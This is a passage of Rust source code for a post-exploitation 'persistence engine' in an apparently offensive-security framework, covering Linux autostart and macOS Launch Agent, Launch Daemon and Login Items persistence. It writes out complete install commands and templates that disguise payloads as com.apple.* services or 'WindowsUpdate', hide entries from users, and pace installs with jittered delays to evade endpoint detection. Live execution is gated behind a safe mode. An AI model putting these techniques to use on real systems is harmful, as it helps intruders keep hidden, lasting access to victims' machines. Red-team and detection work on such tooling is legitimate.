            .unwrap_or_else(|| format!("~/.config/autostart/{}.desktop", handle.persistence_name));
        let cmd = format!("rm -f {}", desktop_path);

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== XDG Autostart Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Desktop File: ~/.config/autostart/{}.desktop\n\n\
            Contents:\n\
            [Desktop Entry]\n\
            Type=Application\n\
            Name={}\n\
            Exec={}\n\
            Hidden=true\n\
            NoDisplay=true\n\
            X-GNOME-Autostart-enabled=true\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, persistence_name, payload_path
        )
    }
}

// ============================================================================
// macOS Persistence Methods
// ============================================================================

/// Launch Agent persistence (user-level)
pub struct LaunchAgentPersistence;

#[async_trait]
impl PersistenceMethod for LaunchAgentPersistence {
    fn name(&self) -> &str { "launch_agent" }
    fn platform(&self) -> Platform { Platform::MacOS }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Medium }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1543.001" }
    fn description(&self) -> &str { "macOS Launch Agent (user-level, runs at login)" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let plist_content = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
            <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
            <plist version=\"1.0\">\n\
            <dict>\n\
                <key>Label</key>\n\
                <string>com.apple.{}</string>\n\
                <key>ProgramArguments</key>\n\
                <array>\n\
                    <string>{}</string>\n\
                </array>\n\
                <key>RunAtLoad</key>\n\
                <true/>\n\
                <key>KeepAlive</key>\n\
                <true/>\n\
            </dict>\n\
            </plist>",
            persistence_name, payload_path
        );

        let plist_path = format!("~/Library/LaunchAgents/com.apple.{}.plist", persistence_name);
        let cmds = vec![
            format!("mkdir -p ~/Library/LaunchAgents"),
            format!("echo '{}' > {}", plist_content, plist_path),
            format!("launchctl load {}", plist_path),
        ];

        info!(method = self.name(), mitre = self.mitre_id(), "Installing Launch Agent persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("plist_path".to_string(), plist_path)].into(),
                }),
                message: "[SAFE MODE] Would create Launch Agent".to_string(),
                commands_executed: cmds,
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("launchctl list | grep com.apple.{}", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let plist_path = handle.metadata.get("plist_path").cloned()
            .unwrap_or_else(|| format!("~/Library/LaunchAgents/com.apple.{}.plist", handle.persistence_name));

        let cmds = vec![
            format!("launchctl unload {}", plist_path),
            format!("rm -f {}", plist_path),
        ];

        if safe_mode {
            for cmd in &cmds {
                debug!("[SAFE MODE] Would execute: {}", cmd);
            }
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Launch Agent Persistence (macOS) ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Plist Path: ~/Library/LaunchAgents/com.apple.{}.plist\n\
            Executable: {}\n\n\
            Install Commands:\n\
            launchctl load ~/Library/LaunchAgents/com.apple.{}.plist\n\n\
            Cleanup Commands:\n\
            launchctl unload ~/Library/LaunchAgents/com.apple.{}.plist\n\
            rm ~/Library/LaunchAgents/com.apple.{}.plist\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path,
            persistence_name, persistence_name, persistence_name
        )
    }
}

/// Launch Daemon persistence (system-level, requires root)
pub struct LaunchDaemonPersistence;

#[async_trait]
impl PersistenceMethod for LaunchDaemonPersistence {
    fn name(&self) -> &str { "launch_daemon" }
    fn platform(&self) -> Platform { Platform::MacOS }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Medium }
    fn requires_admin(&self) -> bool { true }
    fn mitre_id(&self) -> &str { "T1543.001" }
    fn description(&self) -> &str { "macOS Launch Daemon (system-level, requires root)" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let plist_content = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
            <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
            <plist version=\"1.0\">\n\
            <dict>\n\
                <key>Label</key>\n\
                <string>com.apple.{}</string>\n\
                <key>ProgramArguments</key>\n\
                <array>\n\
                    <string>{}</string>\n\
                </array>\n\
                <key>RunAtLoad</key>\n\
                <true/>\n\
                <key>KeepAlive</key>\n\
                <true/>\n\
            </dict>\n\
            </plist>",
            persistence_name, payload_path
        );

        let plist_path = format!("/Library/LaunchDaemons/com.apple.{}.plist", persistence_name);
        let cmds = vec![
            format!("sudo bash -c \"echo '{}' > {}\"", plist_content, plist_path),
            format!("sudo launchctl load {}", plist_path),
        ];

        info!(method = self.name(), mitre = self.mitre_id(), "Installing Launch Daemon persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("plist_path".to_string(), plist_path)].into(),
                }),
                message: "[SAFE MODE] Would create Launch Daemon".to_string(),
                commands_executed: cmds,
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("sudo launchctl list | grep com.apple.{}", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let plist_path = handle.metadata.get("plist_path").cloned()
            .unwrap_or_else(|| format!("/Library/LaunchDaemons/com.apple.{}.plist", handle.persistence_name));

        let cmds = vec![
            format!("sudo launchctl unload {}", plist_path),
            format!("sudo rm -f {}", plist_path),
        ];

        if safe_mode {
            for cmd in &cmds {
                debug!("[SAFE MODE] Would execute: {}", cmd);
            }
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Launch Daemon Persistence (macOS) ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {} (root)\n\n\
            Plist Path: /Library/LaunchDaemons/com.apple.{}.plist\n\
            Executable: {}\n\n\
            Note: Runs as root, survives reboots\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path
        )
    }
}

/// Login Items persistence (macOS)
pub struct LoginItemsPersistence;

#[async_trait]
impl PersistenceMethod for LoginItemsPersistence {
    fn name(&self) -> &str { "login_items" }
    fn platform(&self) -> Platform { Platform::MacOS }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::VeryLow }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1547.011" }
    fn description(&self) -> &str { "macOS Login Items (visible in System Preferences)" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let cmd = format!(
            "osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{}\", hidden:true}}'",
            payload_path
        );

        info!(method = self.name(), mitre = self.mitre_id(), "Installing Login Items persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: HashMap::new(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = "osascript -e 'tell application \"System Events\" to get the name of every login item'";

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmd = format!(
            "osascript -e 'tell application \"System Events\" to delete login item \"{}\"'",
            handle.persistence_name
        );

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Login Items Persistence (macOS) ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {} (Visible in System Preferences)\n\
            Requires Admin: {}\n\n\
            Application: {}\n\n\
            Install Command:\n\
            osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{}\", hidden:true}}'\n\n\
            Note: User can easily see and disable in System Preferences > Users & Groups > Login Items\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path
        )
    }
}

// ============================================================================
// Persistence Engine
// ============================================================================

/// Main Persistence Engine
pub struct PersistenceEngine {
    methods: Vec<Box<dyn PersistenceMethod>>,
    installed: Vec<PersistenceHandle>,
}

impl PersistenceEngine {
    /// Create new engine with all methods registered
    pub fn new() -> Self {
        let methods: Vec<Box<dyn PersistenceMethod>> = vec![
            // Windows
            Box::new(RegistryRunPersistence::new(false)),
            Box::new(RegistryRunPersistence::new(true)),
            Box::new(ScheduledTaskPersistence),
            Box::new(WmiEventPersistence),
            Box::new(WindowsServicePersistence),
            Box::new(StartupFolderPersistence),
            // Linux
            Box::new(CronPersistence),
            Box::new(SystemdPersistence),
            Box::new(ShellRcPersistence::new("bash")),
            Box::new(ShellRcPersistence::new("zsh")),
            Box::new(XdgAutostartPersistence),
            // macOS
            Box::new(LaunchAgentPersistence),
            Box::new(LaunchDaemonPersistence),
            Box::new(LoginItemsPersistence),
        ];

        Self {
            methods,
            installed: Vec::new(),
        }
    }

    /// Get methods for a specific platform
    pub fn methods_for_platform(&self, platform: &Platform) -> Vec<&dyn PersistenceMethod> {
        self.methods
            .iter()
            .filter(|m| m.platform() == *platform || *platform == Platform::Any)
            .map(|m| m.as_ref())
            .collect()
    }

    /// Auto-select best methods based on privileges and stealth requirements
    pub fn auto_select(
        &self,
        platform: &Platform,
        has_admin: bool,
        min_stealth: StealthLevel,
    ) -> Vec<&dyn PersistenceMethod> {
        self.methods_for_platform(platform)
            .into_iter()
            .filter(|m| {
                (has_admin || !m.requires_admin()) && m.stealth_level() >= min_stealth
            })
            .collect()
    }

    /// Install persistence using auto-selected methods
    pub async fn install_auto(
        &mut self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        has_admin: bool,
        redundancy_count: usize,
        safe_mode: bool,
    ) -> Result<Vec<InstallResult>> {
        // Collect method indices to avoid borrow conflicts
        let mut method_indices: Vec<(usize, StealthLevel)> = self.methods
            .iter()
            .enumerate()
            .filter(|(_, m)| {
                let platform_matches = match m.platform() {
                    Platform::Any => true,
                    p => p == session.platform,
                };
                platform_matches
                    && (has_admin || !m.requires_admin())
                    && m.stealth_level() >= StealthLevel::Low
            })
            .map(|(i, m)| (i, m.stealth_level()))
            .collect();

        // Sort by stealth level (highest first)
        method_indices.sort_by(|a, b| b.1.cmp(&a.1));

        let mut results = Vec::new();
        let mut installed_count = 0;

        for (idx, _) in method_indices {
            if installed_count >= redundancy_count {
                break;
            }

            let method = &self.methods[idx];
            let method_name = method.name().to_string();

            match method.install(session, payload_path, persistence_name, safe_mode).await {
                Ok(result) => {
                    if result.success {
                        if let Some(handle) = &result.handle {
                            self.installed.push(handle.clone());
                        }
                        installed_count += 1;
                    }
                    results.push(result);
                }
                Err(e) => {
                    warn!(method = method_name, error = %e, "Failed to install persistence");
                    results.push(InstallResult {
                        success: false,
                        handle: None,
                        message: e.to_string(),
                        commands_executed: vec![],
                    });
                }
            }
        }

        Ok(results)
    }

    /// Verify all installed persistence mechanisms
    pub async fn verify_all(&self, safe_mode: bool) -> Result<Vec<(PersistenceHandle, VerifyResult)>> {
        let mut results = Vec::new();

        for handle in &self.installed {
            let method = self.methods.iter()
                .find(|m| m.name() == handle.method_name)
                .context("Method not found")?;

            match method.verify(handle, safe_mode).await {
                Ok(result) => results.push((handle.clone(), result)),
                Err(e) => {
                    results.push((
                        handle.clone(),
                        VerifyResult {
                            active: false,
                            details: e.to_string(),
                            last_checked: chrono::Utc::now(),
                        },
                    ));
                }
            }
        }

        Ok(results)
    }

    /// Remove all installed persistence mechanisms
    pub async fn remove_all(&mut self, safe_mode: bool) -> Result<Vec<(String, bool)>> {
        let mut results = Vec::new();

        for handle in self.installed.drain(..).collect::<Vec<_>>() {
            let method = self.methods.iter()
                .find(|m| m.name() == handle.method_name);

            if let Some(method) = method {
                match method.remove(&handle, safe_mode).await {
                    Ok(success) => results.push((handle.method_name, success)),
                    Err(e) => {
                        error!(method = handle.method_name, error = %e, "Failed to remove persistence");
                        results.push((handle.method_name, false));
                    }
                }
            }
        }

        Ok(results)
    }

    /// List all available methods with details
    pub fn list_methods(&self) -> String {
        let mut output = String::from("\n=== Available Persistence Methods ===\n\n");

        let platforms = [Platform::Windows, Platform::Linux, Platform::MacOS];

        for platform in &platforms {
            output.push_str(&format!("--- {:?} ---\n", platform));

            for method in self.methods_for_platform(platform) {
                output.push_str(&format!(
                    "  {} [{}] - {} (Admin: {})\n    MITRE: {}\n",
                    method.name(),
                    method.stealth_level().as_str(),
                    method.description(),
                    method.requires_admin(),
                    method.mitre_id()
                ));
            }
            output.push('\n');
        }

        output
    }

    // =========================================================================
    // OPSEC Integration Methods
    // =========================================================================

    /// Install persistence with Ghost mode OPSEC (maximum stealth)
    ///
    /// Uses Ghost-level OPSEC configuration:
    /// - Only VeryHigh stealth methods selected
    /// - 45+ second sleep between installations with 50-80% jitter
    /// - EDR-aware execution
    pub async fn install_ghost(
        &mut self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        has_admin: bool,
        safe_mode: bool,
    ) -> Result<Vec<InstallResult>> {
        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::ghost(), 1, safe_mode).await
    }

    /// Install persistence with Silent mode OPSEC (high stealth)
    pub async fn install_silent(
        &mut self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        has_admin: bool,
        redundancy_count: usize,
        safe_mode: bool,
    ) -> Result<Vec<InstallResult>> {
        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::silent(), redundancy_count, safe_mode).await
    }

    /// Install persistence with Quiet mode OPSEC (balanced)
    pub async fn install_quiet(
        &mut self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        has_admin: bool,
        redundancy_count: usize,
        safe_mode: bool,
    ) -> Result<Vec<InstallResult>> {
        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::quiet(), redundancy_count, safe_mode).await
    }

    /// Install with custom OPSEC configuration
    ///
    /// Applies traffic shaping and delays between each persistence installation
    /// to avoid detection patterns.
    pub async fn install_with_opsec(
        &mut self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        has_admin: bool,
        opsec_config: OpsecConfig,
        redundancy_count: usize,
        safe_mode: bool,
    ) -> Result<Vec<InstallResult>> {
        let traffic_shaper = DefaultTrafficShaper::new(opsec_config.clone());

        info!(
            stealth_level = %opsec_config.stealth_level.as_str(),
            "Installing persistence with OPSEC awareness"
        );

        // Map OPSEC stealth level to minimum persistence stealth level
        let min_stealth = match opsec_config.stealth_level {
            OpsecStealthLevel::Ghost => StealthLevel::VeryHigh,
            OpsecStealthLevel::Silent => StealthLevel::High,
            OpsecStealthLevel::Quiet => StealthLevel::Medium,
            OpsecStealthLevel::Normal => StealthLevel::Low,
        };

        // Filter methods based on stealth requirements
        let mut method_indices: Vec<(usize, StealthLevel)> = self.methods
            .iter()
            .enumerate()
            .filter(|(_, m)| {
                let platform_matches = match m.platform() {
                    Platform::Any => true,
                    p => p == session.platform,
                };
                platform_matches
                    && (has_admin || !m.requires_admin())
                    && m.stealth_level() >= min_stealth
            })
            .map(|(i, m)| (i, m.stealth_level()))
            .collect();

        // Sort by stealth level (highest first)
        method_indices.sort_by(|a, b| b.1.cmp(&a.1));

        let mut results = Vec::new();
        let mut installed_count = 0;

        for (idx, (method_idx, _)) in method_indices.iter().enumerate() {
            if installed_count >= redundancy_count {
                break;
            }

            // Apply OPSEC delay between installations (except first)
            if idx > 0 {
                debug!("Applying OPSEC sleep with jitter before next persistence install");
                traffic_shaper.sleep_with_jitter().await;
            }

            let method = &self.methods[*method_idx];
            let method_name = method.name().to_string();

            match method.install(session, payload_path, persistence_name, safe_mode).await {
                Ok(result) => {
                    if result.success {
                        if let Some(handle) = &result.handle {
                            self.installed.push(handle.clone());
                        }
                        installed_count += 1;
                        info!(
                            method = method_name,
                            "OPSEC persistence installed successfully"
                        );
                    }
                    results.push(result);
                }
                Err(e) => {
                    warn!(method = method_name, error = %e, "OPSEC persistence install failed");
                    results.push(InstallResult {
                        success: false,
                        handle: None,
                        message: e.to_string(),
                        commands_executed: vec![],
                    });
                }
            }
        }

        Ok(results)
    }
}

impl Default for PersistenceEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// Module Implementation
// ============================================================================

/// Persistence Module for Ferox framework integration
pub struct PersistenceModule {
    options: HashMap<String, String>,
    engine: PersistenceEngine,
}

impl PersistenceModule {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("safe_mode".to_string(), "true".to_string());
        options.insert("payload_path".to_string(), String::new());
        options.insert("persistence_name".to_string(), "WindowsUpdate".to_string());
        options.insert("platform".to_string(), "auto".to_string());
        options.insert("method".to_string(), "auto".to_string());
        options.insert("redundancy".to_string(), "2".to_string());
        options.insert("action".to_string(), "install".to_string());

        Self {
            options,
            engine: PersistenceEngine::new(),
        }
    }
}

impl Default for PersistenceModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for PersistenceModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "persistence_engine".to_string(),
            version: "2.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Multi-platform persistence engine with auto-selection, redundancy, and MITRE ATT&CK mapping. AUTHORIZED USE ONLY.".to_string(),
            module_type: ModuleType::PostExploit,
            category: "post".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "safe_mode".to_string(),
                description: "Safe mode (true/false) - reference only, no actual changes".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("safe_mode").cloned(),
            },
            ModuleOption {
                name: "payload_path".to_string(),
                description: "Path to payload executable".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("payload_path").cloned(),
            },
            ModuleOption {
                name: "persistence_name".to_string(),
                description: "Name for persistence mechanism".to_string(),
                required: false,
                default_value: Some("WindowsUpdate".to_string()),
                current_value: self.options.get("persistence_name").cloned(),
            },
            ModuleOption {
                name: "platform".to_string(),
                description: "Target platform: windows/linux/macos/auto".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("platform").cloned(),
            },
            ModuleOption {
                name: "method".to_string(),
                description: "Persistence method or 'auto' for best selection".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("method").cloned(),
            },
            ModuleOption {
                name: "redundancy".to_string(),
                description: "Number of methods to install for redundancy".to_string(),
                required: false,
                default_value: Some("2".to_string()),
                current_value: self.options.get("redundancy").cloned(),
            },
            ModuleOption {
                name: "action".to_string(),
                description: "Action: install/verify/remove/list".to_string(),
                required: false,
                default_value: Some("install".to_string()),
                current_value: self.options.get("action").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_lowercase(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(&name.to_lowercase()).cloned()
    }

    fn validate(&self) -> Result<()> {
        let action = self.options.get("action").cloned().unwrap_or_default();

        if action == "install" {
            let payload = self.options.get("payload_path").cloned().unwrap_or_default();
            if payload.is_empty() {
                bail!("payload_path is required for install action");
            }
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        let platform = self.options.get("platform").cloned().unwrap_or_else(|| "auto".to_string());
        let platform = match platform.as_str() {
            "windows" => Platform::Windows,
            "linux" => Platform::Linux,
            "macos" => Platform::MacOS,
            _ => Platform::Any,
        };

        let methods = self.engine.methods_for_platform(&platform);

        let mut fingerprint = HashMap::new();
        fingerprint.insert("platform".to_string(), format!("{:?}", platform));
        fingerprint.insert("methods_available".to_string(), methods.len().to_string());

        Ok(CheckResult {
            vulnerable: true,
            confidence: 0.9,
            details: format!("{} persistence methods available for {:?}", methods.len(), platform),
            fingerprint,
        })
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        let safe_mode = self.options.get("safe_mode").map(|s| s == "true").unwrap_or(true);
        let action = self.options.get("action").cloned().unwrap_or_else(|| "install".to_string());

        match action.as_str() {
            "list" => {
                let list = self.engine.list_methods();
                Ok(ModuleResult::success("Listed all persistence methods")
                    .with_data("methods", serde_json::json!(list)))
            }

            "install" => {
                let payload_path = self.options.get("payload_path").cloned().unwrap_or_default();
                let persistence_name = self.options.get("persistence_name").cloned().unwrap_or_else(|| "WindowsUpdate".to_string());
                let redundancy: usize = self.options.get("redundancy").and_then(|s| s.parse().ok()).unwrap_or(2);

                let platform = match self.options.get("platform").map(|s| s.as_str()) {
                    Some("windows") => Platform::Windows,
                    Some("linux") => Platform::Linux,
                    Some("macos") => Platform::MacOS,
                    _ => Platform::Any,
                };

                let session = Session::new("persistence".to_string(), "localhost".to_string(), platform.clone());

                let results = self.engine.install_auto(
                    &session,
                    &payload_path,
                    &persistence_name,
                    false, // Assume no admin for safe default
                    redundancy,
                    safe_mode,
                ).await?;

                let successful = results.iter().filter(|r| r.success).count();

                Ok(ModuleResult::success(format!(
                    "Installed {} of {} persistence methods (safe_mode={})",
                    successful, results.len(), safe_mode
                ))
                .with_data("results", serde_json::json!(results))
                .with_data("safe_mode", serde_json::json!(safe_mode)))
            }

            "verify" => {
                let results = self.engine.verify_all(safe_mode).await?;
                let active = results.iter().filter(|(_, v)| v.active).count();

                Ok(ModuleResult::success(format!("{} of {} persistence mechanisms active", active, results.len()))
                    .with_data("results", serde_json::json!(results)))
            }

            "remove" => {
                let results = self.engine.remove_all(safe_mode).await?;
                let removed = results.iter().filter(|(_, s)| *s).count();

                Ok(ModuleResult::success(format!("Removed {} of {} persistence mechanisms", removed, results.len()))
                    .with_data("results", serde_json::json!(results)))
            }

            _ => bail!("Unknown action: {}", action),
        }
    }

    async fn cleanup(&mut self) -> Result<()> {
        let safe_mode = self.options.get("safe_mode").map(|s| s == "true").unwrap_or(true);
        let _ = self.engine.remove_all(safe_mode).await;
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        true
    }
}

// Backward compatibility alias
pub type Persistence = PersistenceModule;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stealth_level_ordering() {
        assert!(StealthLevel::VeryHigh > StealthLevel::High);
        assert!(StealthLevel::High > StealthLevel::Medium);
        assert!(StealthLevel::Medium > StealthLevel::Low);
        assert!(StealthLevel::Low > StealthLevel::VeryLow);
    }

    #[test]
    fn test_engine_creation() {
        let engine = PersistenceEngine::new();
        assert!(!engine.methods.is_empty());
    }

    #[test]
    fn test_platform_filtering() {
        let engine = PersistenceEngine::new();

        let windows_methods = engine.methods_for_platform(&Platform::Windows);
        assert!(windows_methods.iter().all(|m| m.platform() == Platform::Windows));

        let linux_methods = engine.methods_for_platform(&Platform::Linux);
        assert!(linux_methods.iter().all(|m| m.platform() == Platform::Linux));

        let macos_methods = engine.methods_for_platform(&Platform::MacOS);
        assert!(macos_methods.iter().all(|m| m.platform() == Platform::MacOS));
    }

    #[test]
    fn test_auto_select() {
        let engine = PersistenceEngine::new();

        // Without admin, should only get non-admin methods
        let methods = engine.auto_select(&Platform::Windows, false, StealthLevel::VeryLow);
        assert!(methods.iter().all(|m| !m.requires_admin()));

        // With admin, should get admin methods too
        let methods_admin = engine.auto_select(&Platform::Windows, true, StealthLevel::VeryLow);
        assert!(methods_admin.len() >= methods.len());
    }

    #[test]
    fn test_mitre_ids() {
        let engine = PersistenceEngine::new();

        for method in &engine.methods {
            assert!(!method.mitre_id().is_empty());
            assert!(method.mitre_id().starts_with('T'));
        }
    }

    #[tokio::test]
    async fn test_module_safe_mode() {
        let mut module = PersistenceModule::new();
        module.set_option("safe_mode", "true").unwrap();
        module.set_option("action", "list").unwrap();

        let result = module.run().await.unwrap();
        assert!(result.success);
    }

    #[tokio::test]
    async fn test_install_safe_mode() {
        let mut module = PersistenceModule::new();
        module.set_option("safe_mode", "true").unwrap();
        module.set_option("payload_path", "/tmp/test_payload").unwrap();
        module.set_option("persistence_name", "TestPersist").unwrap();
        module.set_option("platform", "linux").unwrap();
        module.set_option("redundancy", "1").unwrap();
        module.set_option("action", "install").unwrap();

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("results"));
    }

    #[test]
    fn test_reference_generation() {
        let method = RegistryRunPersistence::new(false);
        let reference = method.generate_reference("C:\\payload.exe", "TestPersist");

        assert!(reference.contains("Registry Run"));
        assert!(reference.contains("MITRE ATT&CK"));
        assert!(reference.contains("T1547.001"));
    }
}
